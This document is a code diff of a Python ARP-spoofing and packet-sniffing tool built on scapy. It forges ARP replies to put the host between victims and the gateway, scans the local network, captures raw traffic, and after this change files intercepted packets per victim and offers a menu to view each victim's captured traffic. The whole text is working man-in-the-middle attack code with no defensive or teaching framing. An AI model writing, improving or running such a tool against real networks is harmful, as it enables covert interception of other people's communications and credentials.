@@ -224,12 +224,12 @@ def factory(data):
     return obj
 
 def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
-    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))
+    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
+    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), verbose=False)
 
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
-    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
+    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7, verbose=False)
+    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7, verbose=False)
 
 def get_mac(ip):
     arp_request = ARP(pdst=ip)
@@ -257,7 +257,7 @@ def to_CIDR_notation(bytes_network, bytes_netmask):
 def scan(net, interface, timeout=5):
     ret = []
     try:
-        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout)
+        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
         for s, r in ans.res:
             line = [r.src, r.psrc]
             try:
@@ -273,6 +273,7 @@ class Client():
         self.ip = ip
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
+        self.packets = []
 
 
 class IPtable():
@@ -281,12 +282,17 @@ class IPtable():
         self.ip = host_ip
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
-        self.packets = []
         self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
 
     def find(self, client):
         for i, c in enumerate(self.clients):
             if (c.ip == client.ip):
+                return i
+        return -1
+
+    def find_mac(self, mac):
+        for i, c in enumerate(self.clients):
+            if (c.mac == mac):
                 return i
         return -1
 
@@ -318,7 +324,7 @@ class IPtable():
                 for line in i:
                     ips.append(line)
         for i in ips:
-            self.emplase(Client(ips[1], ips[0]))
+            self.emplase(Client(i[1], i[0]))
 
     def attack(self):
         for client in self.clients:
@@ -330,6 +336,11 @@ class IPtable():
             if (client.type == False):
                 restore(client.ip, client.mac, self.gateway_ip, self.mac)
 
+    def insert_packet(self, packet):
+        client_id = self.find_mac(packet.dest_mac)
+        if (client_id != -1):
+            self.clients[client_id].packets.append(packet)
+
 
 def main(Ips):
     Ips.scan()
@@ -337,7 +348,7 @@ def main(Ips):
     while (True):
         raw_data, address = conn.recvfrom(65535)
         Seg = factory(raw_data)
-        Ips.packets.append(Seg)
+        Ips.insert_packet(Seg)
 
 
 
@@ -345,10 +356,12 @@ if __name__ == '__main__':
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
     gateway_mac = get_mac(gateway_ip)
     Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
+    #main(Ips)
     th = threading.Thread(target=main, args=(Ips, ), daemon=True)
+    th.start()
     command = ''
     while (command != 'exit'):
-        command = input('input command:')
+        command = input('input command: ')
         if command == 'help':
             print("print 'ips' to get list of ips")
             print("print 'packets' to get list of spoofed packets")
@@ -357,6 +370,15 @@ if __name__ == '__main__':
             for i in Ips.clients:
                 print(i.ip)
         if command == 'packets':
-            for i in Ips.packets:
+            for i in range(len(Ips.clients)):
+                print(i + 1, Ips.clients[i].ip, len(Ips.clients[i].packets))
+            a = ""
+            while(a != 'back' and (a.isdigit() == False or (int(a) < 1 and int(a) > len(Ips.clients)))):
+                a = input('choose target ip:')
+            if a == 'back':
+                continue
+            a = int(a) - 1
+            for i in Ips.clients[a].packets:
                 i.print_values()
+
     Ips.restore()
